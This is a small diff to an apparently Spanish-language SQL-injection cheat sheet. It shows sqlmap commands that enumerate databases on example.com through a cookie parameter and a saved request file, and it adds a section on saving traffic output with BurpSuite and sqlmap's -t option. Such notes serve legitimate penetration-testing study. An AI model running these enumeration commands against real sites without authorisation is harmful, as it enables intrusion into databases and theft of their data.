@@ -120,6 +120,19 @@ sqlmap -u http://example.com/index.php --cookie="id=*" --dbs --batch
 sqlmap -r request.txt --batch --dbs
 # Por último seguir el paso a paso del principio para revisar tablas, columnas y datos.
 ```
+---
+## Almacenar la salida
+- **BurpSuite**:
+<p align="center">
+  <img src="https://i.postimg.cc/KvnMdscF/sqli-txt.png" alt="sqli"/>
+</p>
+
+- **SQLMap:**
+
+```bash
+sqlmap -u http://example.com?id=1 --batch -t /tmp/request.txt
+cat /tmp/request.txt
+```
 
 ---
 # "Anonimato"
